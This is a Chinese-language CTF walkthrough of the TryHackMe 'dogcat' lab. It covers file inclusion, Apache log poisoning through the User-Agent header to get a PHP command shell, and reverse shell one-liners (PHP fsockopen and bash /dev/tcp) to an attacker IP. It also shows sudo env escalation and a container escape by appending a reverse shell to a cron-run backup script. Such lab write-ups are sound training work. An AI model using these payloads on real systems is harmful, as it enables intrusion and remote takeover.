---
title: "THM Dogcat"
description: "TryHackMe系列之dogcat"

date: 2024-10-18T14:52:51+08:00
lastmod: 2025-11-11T13:48:59+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.89.86

# 信息收集

## nmap扫描

```bash
nmap --min-rate 10000 -A -sV -sC -p- 10.10.89.86
```

![image-20241018160031179](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018160045039-313432027.png)

发现开放22，80端口

## 80端口

![image-20241018152404974](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018152418808-1060650834.png)

发现点击dog或者cat，会显示一张相应的图片

先扫描一下目录

```bash
gobuster dir -u http://10.10.89.86/ -w /usr/share/wordlists/dirb/common.txt
```

![image-20241018160045419](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018160059374-298481108.png)

访问`/cats`显示403，除此之外并没有什么有用的信息

# LIF导致RCE

再次查看我们的页面

![image-20241018161647388](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018161701177-2088714964.png)

在url处有个参数view，尝试一下目录穿越

![image-20241018161756644](https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161810480-951159654.png)

有效果，可以文件包含，并且默认在后面加`.php`文件后缀了

![image-20241018161918408](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018161932049-1336654229.png)

测试后发现可以通过`%00`可以截断

使用伪协议尝试读取源码

```http
?view=php://filter/convert.base64-encode/resource=dog
```

![image-20241018162212286](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018162225948-1416006650.png)

base64解码一下

```bash
echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
```

![image-20241018162316656](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018162330439-314328065.png)

尝试读取一下别的文件

 ```http
?view=php://filter/convert.base64-encode/resource=dog/../index
 ```

![image-20241018162546442](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018162600495-2121576637.png)

发现解码后的代码，我们还可以控制`ext`变量，来控制文件后缀，所以我们就可以读取任意文件了

先读取`/etc/passwd`

```http
?view=view=dog/../../../../etc/passwd&ext=
```

![image-20241018162837485](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018162851221-1049120622.png)

看源码比较清晰一点

这里貌似没什么信息，查看一下日志

```http
?view=view=dog/../../../../../../../var/log/apache2/access.log&ext=
```

最终找到了`apache2`的日志

![image-20241018163515318](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018163529321-1675570605.png)

在最后发现我们的操作会被记录下来，并且请求头的信息也保存了

尝试更改请求头试一下

![image-20241018163836959](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018163851053-760002723.png)

我们自定义的请求头被写入到日志文件中了，尝试写入php代码

````bash
curl "http://10.10.89.86/" -H "User-Agent: <?php system('whoami')?>"
````

![image-20241018164027252](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018164041488-425159992.png)

成功RCE！

# 获得初始访问权限

先将RCE完善一下

```bash
curl "http://10.10.89.86/" -H "User-Agent: <?php system(\$_GET['cmd']);?>"
```

![image-20241018165124697](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018165138954-1219496020.png)

可以执行命令，我们就尝试反弹shell，先建立个监听

![image-20241018164135561](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018164149123-438306846.png)

执行一下反弹shell命令（注意要url编码）

```
php -r '$sock=fsockopen("10.14.90.122", 8888);exec("/bin/bash -i <&3 >&3 2>&3");'
```

![image-20241018181111610](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018181125748-1188823251.png)

成功获取初始权限

![image-20241018181148117](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018181201855-1454053211.png)

在当前页面找到`flag.php`

# 提升至root权限

先找一下flag的位置

```bash
find / -name "*flag*" 2>/dev/null
```

![image-20241018181607197](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018181620922-1758860058.png)

找到flag2

![image-20241018181630748](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018181644383-1741156501.png)

`sudo -l`查看一下

![image-20241018183028748](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018183042873-653679545.png)

发现`env`命令具有root权限，使用`env`命令提权

![image-20241018183050727](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018183104360-4899350.png)

获得root权限

![image-20241018183114104](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018183127751-2047869555.png)

在`/root`下找到`flag3.txt`

# docker逃逸

在根目录中找到`.dockerenv`文件

![image-20241018185109777](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018185123618-1506946845.png)

可知我们在docker内

![image-20241018185208376](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018185222092-292349124.png)

仔细翻找文件后发现以上内容，仔细查看一下，发现像是备份文件的命令，过段时间后会发现`backup.tar`文件的修改时间改变了，推断出可能正在执行一个`cron`任务

我们可以尝试写入反弹shell的命令，并以主机上的 root 身份获取 shell

```
echo "bash -i >& /dev/tcp/10.14.90.122/8889 0>&1" >> backup.sh
```

![image-20241018190841293](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018190855406-938924442.png)主机进行监听，过段时间后我们获取到了主机的shell

![image-20241018191658563](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018191712386-1712812147.png)

成功获取主机shell

![image-20241018191730005](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241018191743754-679623711.png)

在`/root`目录找到最后一个flag